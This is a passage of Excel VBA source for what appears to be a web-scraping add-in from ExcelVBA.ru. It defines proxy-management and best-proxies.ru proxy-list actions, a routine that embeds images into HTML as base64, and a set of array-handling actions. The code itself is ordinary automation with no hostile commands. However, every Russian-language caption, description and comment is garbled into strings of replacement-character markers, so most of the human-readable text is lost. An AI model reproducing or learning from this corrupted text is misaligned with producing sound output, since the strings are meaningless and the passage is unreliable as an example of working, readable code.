                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd|)"

        Dim ProxyCommandsList()
        ProxyCommandsList = Array("Switch to the next", "Add proxy", "Remove proxy", _
                                  "Get current", "Get list", "Check current", "Check all", "Get count", "Enable", "Disable")

        .AddParameter "Command", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd|", ProxyCommandsList, ProxyCommandsList(0)
        .AddParameter "Parameter", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With


    With AAs.AddAction(fc_ParserOptions, "Proxy_GetList_best-proxies.ru", "|fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| best-proxies.ru")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| best-proxies.ru (400 |fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| best-proxies.ru |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| 2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| IP:Port, |fffd||fffd||fffd| XML |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|). |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "APIkey", aps_Text, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Limit", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("0", "20", "50", "100", "500"), "50"
        .AddParameter "Type", aps_List, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("https", "http", "http,https"), "https"
        .AddParameter "Format", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("ip:port", "xml"), "ip:port"
        .AddParameter "Country", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd| 20, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)", Array("", "RU", "UA", "BY", "US", "RU,UA", "-RU,BY,UA,KZ"), ""
        .AddParameter "Level", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "1 - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "2 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "3 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "1,2 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), ""
        .AddParameter "Speed", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "1 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "2 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "3 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "1,2 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), ""
        .AddParameter "Extra", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "uptime=2", "response=2000", "yandex=1", "google=1", "mailru=1", "twitter=1", "nocascade=1"), ""
    End With
End Sub

Function EmbedImagesIntoHTML(ByVal txt$, Optional ByRef WP As WebsiteParser) As String
    On Error Resume Next
    '    |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| HTML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| img, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| src
    '    (|fffd||fffd||fffd||fffd||fffd||fffd| src="/images/123.jpg" |fffd||fffd||fffd||fffd||fffd| src="data:image;base64,R0lGODlhYgBhA...HA=")

    Dim arrIMG_outerHTML, i&, Tag$, ImageURL$, Image_b64$, arr, suffix$, newTag$

    arrIMG_outerHTML = Split(GetTags(txt, "img", , , "outerHTML"), ARSEP)
    For i = LBound(arrIMG_outerHTML) To UBound(arrIMG_outerHTML)
        Tag$ = arrIMG_outerHTML(i)
        arr = "": arr = Split(Tag$, " src=", 2)
        WP.PrInd1.ShowMessage "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & i + 1 & " |fffd||fffd| " & UBound(arrIMG_outerHTML) + 1 & " |fffd||fffd| base64"
        If UBound(arr) = 1 Then    ' |fffd||fffd||fffd||fffd||fffd||fffd| " src="
            ImageURL$ = GetTags(Tag$, "img", , , "src_with_prefix 1")
            Image_b64$ = "data:image;base64," & LoadCaptchaImage(ImageURL$)
            suffix$ = ""
            Select Case Left(arr(1), 1)
                Case "'", """"
                    suffix$ = Split(arr(1), Left(arr(1), 1), 3)(2)
                    newTag$ = arr(0) & " src=" & Left(arr(1), 1) & Image_b64$ & Left(arr(1), 1) & suffix$
                Case Else
                    suffix$ = Split(arr(1), " ", 2)(1)
                    newTag$ = arr(0) & " src=" & "'" & Image_b64$ & "' " & suffix$
            End Select
            txt$ = Replace(txt, Tag$, newTag$)
        End If
    Next i
    EmbedImagesIntoHTML = txt
    WP.PrInd1.HideMessages
End Function

Private Sub testEmbedImagesIntoHTML()
    Dim txt$
    txt = "<div id='question-text'><div>|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|?</div><div><img tabindex='-1' style='HEIGHT: 97px; WIDTH: 98px' src='http://92.255.180.13:9001/QuestionImages/2105/6afadad0-32ed-4bd2-b362-f3773b9ee79d/1/1.jpg' xmlns:xd='http://schemas.microsoft.com/office/infopath/2003'></div></div>"
    txt = txt & "<div id='logo' valign='top'>|fffd||fffd||fffd||fffd||fffd|<a href='/' title='|fffd||fffd||fffd||fffd||fffd||fffd||fffd|'><img src='http://ExcelVBA.ru/sites/default/files/pixture_logo.png' alt='|fffd||fffd||fffd||fffd||fffd||fffd||fffd|'></a></div>"
    txt = txt & "<div id='logo' valign='top'>|fffd||fffd||fffd||fffd||fffd|<a href='/' title='|fffd||fffd||fffd||fffd||fffd||fffd||fffd|'><img src=http://ExcelVBA.ru/sites/default/files/pixture_logo.png alt='|fffd||fffd||fffd||fffd||fffd||fffd||fffd|'></a></div>"
    ShowTextInBrowser EmbedImagesIntoHTML(txt)
End Sub
Attribute VB_Name = "mod_AAs_Array"
'---------------------------------------------------------------------------------------
' Module        : mod_AAs_Array
' Author        : EducatedFool                     Date: 31.08.2014
' Professional application development for Microsoft Excel
' https://ExcelVBA.ru/                     Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit: Option Compare Binary: Option Private Module

Sub InitializeActions_Array(ByRef AAs As ArrayActions)
    On Error Resume Next
    Dim COUNT_ARRAY
    COUNT_ARRAY = Array("1", "2", "3", "4", "5")
    
    With AAs.AddAction(fc_Array, "FirstArrayItems", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
    End With
    
    With AAs.AddAction(fc_Array, "LastArrayItems", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
    End With
    
    With AAs.AddAction(fc_Array, "SelectedArrayItems", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| ...")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "FirstIndex", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "2"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd|", "1", "2", "3", "4", "5"), "|fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Array, "CropLastArrayItems", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Count", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", COUNT_ARRAY, "1"
    End With
    
    With AAs.AddAction(fc_Array, "SeparateArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Mask", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Action", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1 - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "2 - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|", _
            "3 - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|", "4 - |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"), "1 - |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Array, "JoinArrayItems", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "Delimiter", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array(",", ";", " ", "{NL}", "{LF}"), "{LF}"
    End With
    
    With AAs.AddAction(fc_Array, "RemoveDuplicates", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    End With
    
    With AAs.AddAction(fc_Array, "ArrayItemsCount", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "VarName", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Output", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd|"
    End With
    
    With AAs.AddAction(fc_Array, "ReverseArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
    End With
    
    With AAs.AddAction(fc_Array, "SplitToArray", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
            "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)" & vbNewLine & vbNewLine & _
            "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "Delimiter", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array(",", "|", "{NL}", "{LF}"), "{NL}"
    End With
    
